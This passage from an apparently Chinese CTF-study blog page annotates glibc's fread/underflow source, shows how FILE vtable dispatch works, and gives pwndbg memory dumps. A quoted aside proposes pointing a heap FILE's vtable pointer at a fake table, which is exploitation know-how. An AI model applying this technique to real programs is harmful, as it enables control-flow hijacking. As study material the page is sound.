class="comment">//count用于计算需要使用syscall-read进行io的字节数</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base)&#123;</span><br><span class="line">	      		_IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      		<span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">					count -= want % block_size;<span class="comment">//减去最后一个不完整的块大小</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		count = _IO_SYSREAD (fp, s, count);							<span class="comment">//把整数个块直接读出来		</span></span><br><span class="line">	  		<span class="keyword">if</span> (count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">					fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      		<span class="keyword">else</span></span><br><span class="line">					fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">	      		<span class="keyword">break</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		s += count;</span><br><span class="line">	  		want -= count;											<span class="comment">//到此want可能还有剩下的最后不完整的一块,下一次循环时刷新缓冲区满足</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    		_IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="underflow">underflow</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__underflow @</span><br><span class="line">	-&gt;_IO_new_file_underflow @fileops.c:<span class="number">469</span></span><br><span class="line">		指针复位</span><br><span class="line">		-&gt;_IO_file_read</span><br><span class="line">			-&gt;_IO_new_file_underflow</span><br><span class="line">				-&gt;__read(fp-&gt;_fileno, buf, size)</span><br></pre></td></tr></table></figure>
<p>fread调用的underflow和fwrite调用的overflow是一对兄弟函数</p>
<p>underflow意思是从文件往缓冲区载入数据,维持读缓冲区满</p>
<p>overflow意思是从缓冲区向文件写入数据,维持写缓冲区空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)<span class="comment">//如果当前fp字节流使用宽字节,则调用fwide</span></span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))<span class="comment">//如果当前fp处于写入状态,则切换状态为读取状态</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有东西则返回当前read_ptr指向的字节</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))			</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_IO_UNDERFLOW</code>实际上调用的_<code>IO_new_file_underflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_underflow(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)		<span class="comment">//必须要有READ权限</span></span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno(EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有剩余的东西,则不允许刷新</span></span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">//如果还没有建立缓冲区,现在就建立</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_doallocbuf(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))		<span class="comment">//对于行缓冲和无缓冲的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">       required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">       traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">       not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">       explicitly.  --drepper */</span></span><br><span class="line">        _IO_acquire_lock(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">            _IO_OVERFLOW(<span class="built_in">stdout</span>, EOF);<span class="comment">//刷新stdout缓冲</span></span><br><span class="line"></span><br><span class="line">        _IO_release_lock(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _IO_switch_to_get_mode(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">       pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">       we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">       input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<span class="comment">//缓冲区复位</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,		<span class="comment">//缓冲区更新,从文件读取,塞满整个缓冲区</span></span><br><span class="line">                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">            fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_IO_read_end += count;			<span class="comment">//读缓冲区根据实际count数决定</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">       handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">       unset it.  */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="vtable何时发挥作用">vtable何时发挥作用?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br></pre></td></tr></table></figure>
<p>从<code>_IO_sgetn</code>调用<code>_IO_file_xsgetn</code>时首先需要‘调用’<code>_IO_XSGETN</code>,这实际上是一个宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br></pre></td></tr></table></figure>
<p>如果展开这个宏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_XSGETN(FP, DATA, N) </span><br><span class="line">= JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="line">= (_IO_JUMPS_FUNC(FP)-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_JUMPS_FILE_plus (FP))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_CAST_FIELD_ACCESS ((FP), struct _IO_FILE_plus, vtable))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (FP-&gt;vtable)[__xsgetn] ) (FP, DATA, N)</span><br><span class="line"></span><br><span class="line">IO_validate_vtable接受一个vtable指针,原封不动地返回,只对这个vtable做一些校验</span><br><span class="line">=(FP-&gt;vtable)[__xsgetn](FP, DATA, N)</span><br><span class="line"></span><br><span class="line">__xsgetn可以理解为偏移量或者枚举值</span><br><span class="line">fp的vtable表中偏移量为__xsgetn处就是_IO_file_xsgetn</span><br><span class="line">=_IO_file_xsgetn (FP, DATA, N)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还有一种思路是保持真表不变,但是篡改真表上的函数指针</p>
<p>但是前提是真表所在的内存区块可写</p>
<p>然而事实上不可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all.vtable</span><br><span class="line">$5 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; info target</span><br><span class="line">	...</span><br><span class="line">	0x00007ffff7dcd900 - 0x00007ffff7dd0ba0 is .data.rel.ro in /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	...</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">	...</span><br><span class="line"> 0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>只可读</p>
<p>因此只能考虑当<code>_IO_list_all</code>位于堆区时,修改其vtable指针指向假表</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$25 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$26 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x6020f0,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x602100,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/30gx file</span><br><span class="line">0x602010:       0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x00007ffff7dd2540</span><br><span class="line">0x602080:       0x0000000000000003      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x00000000006020f0</span><br><span class="line">0x6020a0:       0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x6020b0:       0x0000000000602100      0x0000000000000000</span><br><span class="line">0x6020c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0	//此处为vtable指针</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">subgraph stack[&quot;stack&quot;]</span><br><span class="line"></span><br><span class="line">	subgraph main [&quot;main frame&quot;]</span><br><span class="line">		filepointer[&quot;FILE* file&quot;]</span><br><span class="line">		style filepointer fill:RED</span><br><span class="line">	end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">subgraph glibcdata [&quot;glibc memory&quot;]</span><br><span class="line">	subgraph table [&quot;_IO_file_jumps&quot;]</span><br><span class="line">			__xsputn[&quot;__xsputn&quot;]</span><br><span class="line">			__xsgetn[&quot;__xsgetn&quot;]</span><br><span class="line">			etc[&quot;...&quot;]</span><br><span class="line">			style __xsputn fill:RED</span><br><span class="line">			style __xsgetn fill:RED</span><br><span class="line">			style etc fill:RED</span><br><span class="line">	end</span><br><span class="line">	style table fill:GREEN</span><br><span class="line">	</span><br><span class="line">	xsputn[&quot;_IO_new_file_xsputn&quot;]</span><br><span class="line">  	xsgetn[&quot;__GI__IO_file_xsgetn&quot;]</span><br><span class="line">  	style xsputn fill:YELLOW</span><br><span class="line">  	style xsgetn fill:YELLOW</span><br><span class="line">  	</span><br><span class="line">  	subgraph plus1[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stderr[&quot;struct FILE stderr&quot;]</span><br><span class="line">  		vtable1[&quot;vtable&quot;]</span><br><span class="line">  		</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus2[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdout[&quot;struct FILE stdout&quot;]</span><br><span class="line">  		vtable2[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus3[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdin[&quot;struct FILE stdin&quot;]</span><br><span class="line">  		vtable3[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	</span><br><span class="line">  	listhead[&quot;_IO_list_all&quot;]</span><br><span class="line">  	style listhead fill:RED</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	style vtable1 fill:RED</span><br><span class="line">  	style vtable2 fill:RED</span><br><span class="line">  	style vtable3 fill:RED</span><br><span class="line">  	style stderr fill:GREEN</span><br><span class="line">	style stdout fill:GREEN</span><br><span class="line">	style stdin fill:GREEN</span><br><span class="line">	style plus1 fill:GREEN</span><br><span class="line">	style plus2 fill:GREEN</span><br><span class="line">	style plus3 fill:GREEN</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">subgraph heap [&quot;heap&quot;]</span><br><span class="line">	subgraph plus [&quot;_IO_FILE_plus&quot;]</span><br><span class="line">		file[&quot;struct FILE file&quot;]</span><br><span class="line">		vtable[&quot;vtable&quot;]	</span><br><span class="line">		style file fill:GREEN</span><br><span class="line">		style vtable fill:RED</span><br><span class="line">	end	</span><br><span class="line">	style plus fill:GREEN</span><br><span class="line">	</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filepointer--&gt;file</span><br><span class="line">vtable----&gt;table</span><br><span class="line"></span><br><span class="line">file--chain--&gt;stderr--chain--&gt;stdout--chain--&gt;stdin--chain--&gt;null</span><br><span class="line">  	__xsputn--&gt;xsputn</span><br><span class="line">  	__xsgetn--&gt;xsgetn</span><br><span class="line">listhead--&gt;plus1</span><br><span class="line">  </span><br><span class="line">subgraph example [&quot;图例&quot;]</span><br><span class="line">	function[&quot;函数&quot;]</span><br><span class="line">	style function fill:YELLOW</span><br><span class="line">	struct[&quot;对象&quot;]</span><br><span class="line">	style struct fill:GREEN</span><br><span class="line">	pointer[&quot;指针&quot;]</span><br><span class="line">	style pointer fill:RED</span><br><span class="line">end</span><br><span class="line">style example fill:GRAY</span><br></pre></td></tr></table></figure>
<p><strong>综上,fopen的作用是,创建一个新的<code>_IO_FILE_plus</code>结构体(包括FILE和vtable两部分)并初始化之,然后头插法将其链接到<code>_IO_list_all</code>链表上</strong></p>
<h3 id="fwrite">fwrite</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流
<strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
<p>实际上调用跳转表函数<code>vtable.__xsputn</code></p>
<p>整个调用过程链</p>
